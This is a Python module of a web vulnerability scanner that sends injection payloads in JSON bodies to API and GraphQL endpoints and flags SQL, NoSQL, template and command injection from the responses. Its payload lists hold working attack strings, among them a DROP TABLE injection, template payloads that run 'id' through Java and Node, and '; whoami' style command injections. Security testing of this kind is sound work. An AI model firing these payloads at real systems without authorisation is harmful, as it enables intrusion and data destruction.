"""
cyberm4fia-scanner - API Body Injection Engine
Tests API endpoints discovered by the crawler with JSON/form body injection.

Modern apps (React/Next.js/Vue) often have API endpoints that accept JSON
bodies but have no visible HTML forms. This module fills that gap by:
  1. Detecting API endpoints (from crawler or known patterns)
  2. Probing them with JSON bodies to find accepted params
  3. Injecting SQLi/XSS/SSTI/CMDi payloads into accepted params
  4. Detecting vulnerabilities via error patterns in JSON responses
"""

from urllib.parse import urlparse, urljoin
import json
import re

from utils.colors import log_info, log_success, log_vuln, log_warning
from utils.request import smart_request, increment_vulnerability_count, ScanExceptions

# ── JSON Error Leak Patterns ────────────────────────────────────────────
JSON_ERROR_PATTERNS = {
    "stack_trace": [
        "traceback", "stack trace", "at module.", "at object.",
        "at function.", "    at ", "error:", "exception:",
        "syntaxerror", "typeerror", "referenceerror",
    ],
    "sql_error": [
        "sql syntax", "mysql", "postgresql", "sqlite",
        "ora-0", "sqlstate", "unclosed quotation",
        "quoted string not properly terminated",
        "pg_query", "mysql_fetch", "mysqli_",
    ],
    "nosql_error": [
        "bsontype", "mongoerror", "mongo server error",
        "e11000 duplicate key", "cast to objectid failed",
        "cannot apply", "$where",
    ],
    "path_traversal": [
        "no such file", "enoent", "file not found",
        "permission denied", "access denied",
        "open()", "readfile()", "include(",
    ],
    "template_error": [
        "template syntax error", "jinja2", "twig",
        "undefined variable", "unexpected token",
        "ejs", "pug", "handlebars",
    ],
    "debug_info": [
        "debug", "internal server error", "500",
        "development mode", "verbose",
        "__dirname", "process.env", "config.",
    ],
    "info_disclosure": [
        "password", "secret", "api_key", "apikey",
        "access_token", "private_key", "credentials",
        "database_url", "connection_string",
    ],
}

# ── Injection Payloads for JSON bodies ──────────────────────────────────
SQLI_JSON_PAYLOADS = [
    "' OR '1'='1",
    "1' AND SLEEP(2)--",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
    "'; DROP TABLE users--",
    "1' UNION SELECT null,null--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
]

XSS_JSON_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{7*7}}",
    "${7*7}",
    "{{constructor.constructor('alert(1)')()}}",
]

SSTI_JSON_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
]

NOSQL_JSON_PAYLOADS = [
    {"$gt": ""},
    {"$ne": ""},
    {"$regex": ".*"},
    {"$where": "1==1"},
]

CMDI_JSON_PAYLOADS = [
    "; whoami",
    "| whoami",
    "$(whoami)",
    "`whoami`",
    "127.0.0.1; id",
]

# ── Common API param names to probe ─────────────────────────────────────
API_PROBE_BODIES = [
    {"id": "1", "name": "test"},
    {"email": "test@test.com", "password": "test"},
    {"q": "test", "query": "test"},
    {"search": "test"},
    {"username": "admin", "password": "admin"},
    {"user": "test", "pass": "test"},
    {"file": "test.txt", "path": "/tmp"},
    {"url": "http://127.0.0.1", "callback": "http://127.0.0.1"},
    {"cmd": "test", "command": "test", "action": "test"},
    {"template": "test", "view": "test", "page": "test"},
    {"data": "test", "input": "test", "value": "test"},
    {"token": "test", "key": "test"},
]


def _detect_api_endpoint(url):
    """Check if URL looks like an API endpoint."""
    parsed = urlparse(url)
    path = parsed.path.lower()

    api_indicators = [
        "/api/", "/v1/", "/v2/", "/v3/",
        "/graphql", "/rest/", "/json/",
        "/_next/data/", "/trpc/",
        ".json", ".api",
    ]

    return any(ind in path for ind in api_indicators)


def _detect_graphql(url, delay):
    """Detect if URL is a GraphQL endpoint."""
    # Try introspection query
    introspection = {
        "query": "{ __schema { types { name } } }"
    }
    try:
        resp = smart_request(
            "post", url,
            json=introspection,
            delay=delay,
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code == 200:
            try:
                data = resp.json()
                if "data" in data and "__schema" in (data.get("data") or {}):
                    return True, data
            except (json.JSONDecodeError, ValueError):
                pass
    except ScanExceptions:
        pass
    return False, None


def _check_json_errors(response_text, baseline_text=""):
    """Check JSON response for error leaks."""
    text_lower = response_text.lower()
    baseline_lower = baseline_text.lower() if baseline_text else ""
    findings = []

    for category, patterns in JSON_ERROR_PATTERNS.items():
        for pattern in patterns:
            if pattern in text_lower and pattern not in baseline_lower:
                findings.append({
                    "category": category,
                    "pattern": pattern,
                })

    return findings


def _inject_payload_into_body(body, param, payload):
    """Replace a param value with an injection payload."""
    injected = dict(body)
    injected[param] = payload
    return injected


def scan_api_injection(url, discovered_endpoints, delay, options=None):
    """
    Scan API endpoints with body injection.

    Args:
        url: Base target URL
        discovered_endpoints: List of API endpoints from crawler
        delay: Request delay
        options: Scan options

    Returns:
        list of vulnerability dicts
    """
    options = options or {}
    vulns = []

    # Collect API endpoints
    api_endpoints = []

    # From discovered endpoints
    if discovered_endpoints:
        for ep in discovered_endpoints:
            if isinstance(ep, str):
                full_url = urljoin(url, ep) if not ep.startswith("http") else ep
                api_endpoints.append(full_url)
            elif isinstance(ep, dict):
                ep_url = ep.get("url", "")
                full_url = urljoin(url, ep_url) if not ep_url.startswith("http") else ep_url
                api_endpoints.append(full_url)

    # Also check if base URL has API patterns
    if _detect_api_endpoint(url):
        api_endpoints.append(url)

    if not api_endpoints:
        return vulns

    # Deduplicate
    api_endpoints = list(dict.fromkeys(api_endpoints))

    log_info(
        f"🔌 Testing {len(api_endpoints)} API endpoint(s) "
        f"with body injection..."
    )

    for endpoint in api_endpoints[:20]:  # Limit to 20 endpoints
        # ── Phase 1: GraphQL Detection ──
        is_graphql, schema_data = _detect_graphql(endpoint, delay)
        if is_graphql:
            log_success(f"  📊 GraphQL endpoint detected: {endpoint}")
            increment_vulnerability_count()
            vulns.append({
                "type": "GraphQL_Introspection",
                "url": endpoint,
                "payload": "{ __schema { types { name } } }",
                "description": (
                    "GraphQL introspection is enabled, exposing the "
                    "entire API schema including types, queries, and mutations."
                ),
                "severity": "MEDIUM",
                "evidence": json.dumps(schema_data)[:500] if schema_data else "",
            })

            # Test GraphQL-specific injections
            graphql_sqli = [
                {"query": "{ user(id: \"1' OR '1'='1\") { name } }"},
                {"query": "{ user(id: \"1 UNION SELECT null--\") { name } }"},
                {"query": "mutation { login(email: \"admin'--\", password: \"x\") { token } }"},
            ]
            for gql_payload in graphql_sqli:
                try:
                    resp = smart_request(
                        "post", endpoint,
                        json=gql_payload,
                        delay=delay,
                        headers={"Content-Type": "application/json"},
                    )
                    errors = _check_json_errors(resp.text)
                    sql_errors = [e for e in errors if e["category"] == "sql_error"]
                    if sql_errors:
                        increment_vulnerability_count()
                        log_vuln(
                            f"SQLi in GraphQL: {endpoint} "
                            f"[{sql_errors[0]['pattern']}]"
                        )
                        vulns.append({
                            "type": "SQLi_GraphQL",
                            "url": endpoint,
                            "payload": json.dumps(gql_payload),
                            "error": sql_errors[0]["pattern"],
                            "severity": "HIGH",
                        })
                        break
                except ScanExceptions:
                    pass

        # ── Phase 2: JSON Body Probe ──
        # Get baseline response with empty/generic body
        baseline_text = ""
        try:
            baseline_resp = smart_request(
                "post", endpoint,
                json={"_test": "baseline"},
                delay=delay,
                headers={"Content-Type": "application/json"},
            )
            baseline_text = baseline_resp.text
        except ScanExceptions:
            try:
                baseline_resp = smart_request("get", endpoint, delay=delay)
                baseline_text = baseline_resp.text
            except ScanExceptions:
                continue

        # Try each probe body to find accepted params
        accepted_params = []
        for probe_body in API_PROBE_BODIES:
            try:
                resp = smart_request(
                    "post", endpoint,
                    json=probe_body,
                    delay=delay,
                    headers={"Content-Type": "application/json"},
                )

                # Check if any param was reflected or caused a different response
                for param, value in probe_body.items():
                    if value in resp.text and value not in baseline_text:
                        accepted_params.append(param)
                    elif resp.status_code != baseline_resp.status_code:
                        accepted_params.append(param)

                # Check for error leaks from the probe itself
                errors = _check_json_errors(resp.text, baseline_text)
                if errors:
                    for err in errors:
                        if err["category"] == "info_disclosure":
                            increment_vulnerability_count()
                            log_vuln(
                                f"Info Disclosure in API: {endpoint} "
                                f"[{err['pattern']}]"
                            )
                            vulns.append({
                                "type": "API_Info_Disclosure",
                                "url": endpoint,
                                "payload": json.dumps(probe_body),
                                "category": err["category"],
                                "pattern": err["pattern"],
                                "severity": "MEDIUM",
                            })
                        elif err["category"] in ["debug_info", "stack_trace"]:
                            increment_vulnerability_count()
                            log_vuln(
                                f"Debug/Stack Trace Leak: {endpoint} "
                                f"[{err['pattern']}]"
                            )
                            vulns.append({
                                "type": "API_Debug_Leak",
                                "url": endpoint,
                                "payload": json.dumps(probe_body),
                                "category": err["category"],
                                "pattern": err["pattern"],
                                "evidence": resp.text[:500],
                                "severity": "LOW",
                            })

            except ScanExceptions:
                continue

        # Deduplicate accepted params
        accepted_params = list(dict.fromkeys(accepted_params))

        if not accepted_params:
            # If no params accepted, try common attack params directly
            accepted_params = ["id", "name", "q", "query", "data", "input"]

        # ── Phase 3: Injection Testing ──
        for param in accepted_params[:6]:  # Max 6 params per endpoint
            base_body = {param: "test_value"}

            # SQLi injection
            for payload in SQLI_JSON_PAYLOADS:
                try:
                    injected = _inject_payload_into_body(base_body, param, payload)
                    resp = smart_request(
                        "post", endpoint,
                        json=injected,
                        delay=delay,
                        headers={"Content-Type": "application/json"},
                    )
                    errors = _check_json_errors(resp.text, baseline_text)
                    sql_errors = [
                        e for e in errors if e["category"] == "sql_error"
                    ]
                    if sql_errors:
                        increment_vulnerability_count()
                        log_vuln(
                            f"SQLi in API body: {endpoint} "
                            f"[param={param}] [{sql_errors[0]['pattern']}]"
                        )
                        vulns.append({
                            "type": "SQLi_API_Body",
                            "url": endpoint,
                            "param": param,
                            "payload": payload,
                            "error": sql_errors[0]["pattern"],
                            "method": "POST",
                            "content_type": "application/json",
                            "severity": "HIGH",
                        })
                        break
                except ScanExceptions:
                    pass

            # NoSQL injection
            for payload in NOSQL_JSON_PAYLOADS:
                try:
                    injected = dict(base_body)
                    injected[param] = payload
                    resp = smart_request(
                        "post", endpoint,
                        json=injected,
                        delay=delay,
                        headers={"Content-Type": "application/json"},
                    )
                    errors = _check_json_errors(resp.text, baseline_text)
                    nosql_errors = [
                        e for e in errors if e["category"] == "nosql_error"
                    ]
                    if nosql_errors:
                        increment_vulnerability_count()
                        log_vuln(
                            f"NoSQL Injection in API: {endpoint} "
                            f"[param={param}]"
                        )
                        vulns.append({
                            "type": "NoSQLi_API",
                            "url": endpoint,
                            "param": param,
                            "payload": json.dumps(payload),
                            "error": nosql_errors[0]["pattern"],
                            "severity": "HIGH",
                        })
                        break
                except ScanExceptions:
                    pass

            # SSTI injection
            for payload in SSTI_JSON_PAYLOADS:
                try:
                    injected = _inject_payload_into_body(base_body, param, payload)
                    resp = smart_request(
                        "post", endpoint,
                        json=injected,
                        delay=delay,
                        headers={"Content-Type": "application/json"},
                    )
                    # Check for template evaluation
                    if "49" in resp.text and "49" not in baseline_text:
                        # 7*7 = 49 → template evaluated!
                        increment_vulnerability_count()
                        log_vuln(
                            f"SSTI in API body: {endpoint} "
                            f"[param={param}]"
                        )
                        vulns.append({
                            "type": "SSTI_API_Body",
                            "url": endpoint,
                            "param": param,
                            "payload": payload,
                            "evidence": "Template expression '7*7' evaluated to '49'",
                            "severity": "CRITICAL",
                        })
                        break

                    errors = _check_json_errors(resp.text, baseline_text)
                    tpl_errors = [
                        e for e in errors if e["category"] == "template_error"
                    ]
                    if tpl_errors:
                        increment_vulnerability_count()
                        log_vuln(
                            f"SSTI Error Leak: {endpoint} "
                            f"[param={param}] [{tpl_errors[0]['pattern']}]"
                        )
                        vulns.append({
                            "type": "SSTI_Error_API",
                            "url": endpoint,
                            "param": param,
                            "payload": payload,
                            "error": tpl_errors[0]["pattern"],
                            "severity": "HIGH",
                        })
                        break
                except ScanExceptions:
                    pass

            # XSS injection (in JSON response)
            for payload in XSS_JSON_PAYLOADS:
                try:
                    injected = _inject_payload_into_body(base_body, param, payload)
                    resp = smart_request(
                        "post", endpoint,
                        json=injected,
                        delay=delay,
                        headers={"Content-Type": "application/json"},
                    )
                    if payload in resp.text and payload not in baseline_text:
                        content_type = resp.headers.get("content-type", "")
                        # If response is HTML (not JSON), it's more serious
                        if "html" in content_type.lower():
                            increment_vulnerability_count()
                            log_vuln(
                                f"XSS via API body: {endpoint} "
                                f"[param={param}]"
                            )
                            vulns.append({
                                "type": "XSS_API_Body",
                                "url": endpoint,
                                "param": param,
                                "payload": payload,
                                "severity": "HIGH",
                            })
                            break
                        elif "json" in content_type.lower():
                            # Reflected in JSON — lower severity but still notable
                            vulns.append({
                                "type": "XSS_JSON_Reflection",
                                "url": endpoint,
                                "param": param,
                                "payload": payload,
                                "severity": "LOW",
                                "description": (
                                    "XSS payload reflected in JSON response. "
                                    "Exploitable if consumed by a frontend without sanitization."
                                ),
                            })
                            break
                except ScanExceptions:
                    pass

            # CMDi injection
            for payload in CMDI_JSON_PAYLOADS:
                try:
                    injected = _inject_payload_into_body(base_body, param, payload)
                    resp = smart_request(
                        "post", endpoint,
                        json=injected,
                        delay=delay,
                        headers={"Content-Type": "application/json"},
                    )
                    # Check for command execution indicators
                    cmdi_sigs = [
                        "root:", "uid=", "gid=", "www-data",
                        "daemon", "nobody",
                    ]
                    for sig in cmdi_sigs:
                        if sig in resp.text and sig not in baseline_text:
                            increment_vulnerability_count()
                            log_vuln(
                                f"CMDi in API body: {endpoint} "
                                f"[param={param}]"
                            )
                            vulns.append({
                                "type": "CMDi_API_Body",
                                "url": endpoint,
                                "param": param,
                                "payload": payload,
                                "evidence": sig,
                                "severity": "CRITICAL",
                            })
                            break
                except ScanExceptions:
                    pass

    if vulns:
        log_success(
            f"🔌 API injection testing complete: "
            f"{len(vulns)} finding(s)"
        )
    else:
        log_info("🔌 No API injection vulnerabilities found.")

    return vulns
